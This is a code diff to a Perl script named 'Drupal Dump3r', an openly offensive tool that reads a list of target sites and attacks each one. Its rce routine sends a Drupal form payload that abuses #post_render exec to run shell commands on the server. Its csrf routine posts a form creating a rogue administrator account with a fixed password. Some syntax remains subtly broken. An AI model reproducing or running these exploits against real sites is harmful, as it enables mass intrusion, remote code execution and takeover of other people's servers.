@@ -1,7 +1,7 @@
 #!/usr/bin/perl
 
 use
-if $ ^ O eq "MSWin32", Win32::Console::ANSI;
+if $^O eq "MSWin32", Win32::Console::ANSI;
 use LWP::Simple;
 use LWP::UserAgent;
 use Term::ANSIColor;
@@ -9,12 +9,12 @@ use HTTP::Request;
 use HTTP::Request::Common qw(POST);
 use HTTP::Request::Common qw(GET);
 
-system(($ ^ O eq 'MSWin32') ? 'cls' : 'clear');
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
 
 print color('bold blue'), "\n\n#";
 print color('bold magenta'), "Enter siteslist path > ";
 print color('bold white');
-$list = < STDIN > ;
+$list = <STDIN>;
 chomp($list);
 if (!-e $list) {
   while (!-e $list) {
@@ -23,7 +23,7 @@ if (!-e $list) {
     print color('bold blue'), "\n#";
     print color('bold magenta'), "Enter siteslist path > ";
     print color('bold white');
-    $list = < STDIN > ;
+    $list = <STDIN> ;
     chomp($list);
 
   }
@@ -32,17 +32,16 @@ if (!-e $list) {
 print color('bold blue'), "#";
 print color('bold magenta'), "Enter ouputs filename/path > ";
 print color('bold white');
-$output = < STDIN > ;
+$output = <STDIN> ;
 chomp($output);
 
-system(($ ^ O eq 'MSWin32') ? 'cls' : 'clear');
-yak0d3();
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
 print color('bold white'), "		|Type help for `help` screen and `run` to start|\n";
 
 exit_code() if ($output eq 'exit');
 print color('bold cyan'), "\n\Dumper > ";
 print color('bold white');
-$cmd = < STDIN > ;
+$cmd = <STDIN> ;
 chomp($cmd);
 
 while (commands() eq 0) {
@@ -51,7 +50,7 @@ while (commands() eq 0) {
 
   print color('bold cyan'), "\n\Dumper > ";
   print color('bold white');
-  $cmd = < STDIN > ;
+  $cmd = <STDIN> ;
   chomp($cmd);
 
 }
@@ -66,7 +65,7 @@ sub commands() {
     print color('bold white'), "\n============================\n";
     print color('bold cyan'), "\n\Dumper > ";
     print color('bold white');
-    $cmd = < STDIN > ;
+    $cmd = <STDIN> ;
     chomp($cmd);
   }
   if ($cmd eq "exit") {
@@ -76,9 +75,8 @@ sub commands() {
     or $cmd eq "start"
     or $cmd eq "exploit") {
 
-    system(($ ^ O eq 'MSWin32') ? 'cls' : 'clear');
-    system(($ ^ O eq 'MSWin32') ? 'mode con:cols=100 lines=40' : 'resize -s 40 100');
-    yak0d3();
+    system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+    system(($^O eq 'MSWin32') ? 'mode con:cols=100 lines=40' : 'resize -s 40 100');
 
     open my $handle, '<', $list;
     chomp(my @targets = < $handle > );
@@ -105,7 +103,6 @@ sub commands() {
 }
 
 sub exit_code() {
-  yak0d3();
   print color('bold white'), "\n\n Bye!\n\n";
   exit;
 }
@@ -117,9 +114,9 @@ sub exploit() {
 }
 
 sub addnewadmin() {
-  $ua = LWP::UserAgent - > new(keep_alive => 1);
-  $ua - > agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
-  $ua - > timeout(20);
+  $ua = LWP::UserAgent -> new(keep_alive => 1);
+  $ua -> agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
+  $ua -> timeout(20);
 
   $drupalink = $site;
   my $cmd = "$target?url=$target&submit=submit";
@@ -129,7 +126,7 @@ sub addnewadmin() {
   '/user/login';
   $red = $site.
   '/user/1';
-  my $checkk = $ua - > get("$cmd") - > content;
+  my $checkk = $ua -> get("$cmd") -> content;
   if ($checkk = ~/Success!/) {
 
     open(my $fd, ">>$output");
@@ -153,14 +150,14 @@ sub addnewadmin() {
 }
 
 sub rce() {
-  my $ua = LWP::UserAgent - > new;
+  my $ua = LWP::UserAgent -> new;
 
   $cmd = "$target/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
 
-  $response = $ua - > post($cmd, Content => ["form_id" => "user_register_form", "_drupa_ajax" => "1", "mail[#post_render][]" => "exec", "mail[#type]" => "markup", "mail[#markup]" => "Pwned by Drupal Dump3r> dumper.html"]);
+  $response = $ua -> post($cmd, Content => ["form_id" => "user_register_form", "_drupa_ajax" => "1", "mail[#post_render][]" => "exec", "mail[#type]" => "markup", "mail[#markup]" => "Pwned by Drupal Dump3r> dumper.html"]);
 
   $shell = "$target/vuln.html";
-  my $content = $ua - > get("$shell") - > content;
+  my $content = $ua -> get("$shell") -> content;
   if ($content = ~/Vuln/) {
 
     open(my $fd, ">>$output");
@@ -183,11 +180,11 @@ sub rce() {
 }
 
 sub csrf() {
-  my $ua = LWP::UserAgent - > new;
+  my $ua = LWP::UserAgent -> new;
 
   $mail = 'new_admin@new_admin.com';
   $cmd = "$target/admin/people/create?render=overlay&render=overlay";
-  $response = $ua - > post($cmd, Content - Type => 'multipart/form-data', Content => ['name' => 'new_admin', 'mail' => $mail, 'pass[pass1]' => 'new_password', 'pass[pass2]' => 'new_password', 'status' => '1', 'roles[3]' => '3', 'timezone' => 'Europe/Prague', 'form_build_id' => 'form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY', 'form_token' => 'cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc', 'form_id' => 'user_register_form', 'op' => 'Create new account']);
+  $response = $ua -> post($cmd, Content - Type => 'multipart/form-data', Content => ['name' => 'new_admin', 'mail' => $mail, 'pass[pass1]' => 'new_password', 'pass[pass2]' => 'new_password', 'status' => '1', 'roles[3]' => '3', 'timezone' => 'Europe/Prague', 'form_build_id' => 'form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY', 'form_token' => 'cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc', 'form_id' => 'user_register_form', 'op' => 'Create new account']);
 
   if ($response = ~/200/) {
     print color('bold blue'), "		[";
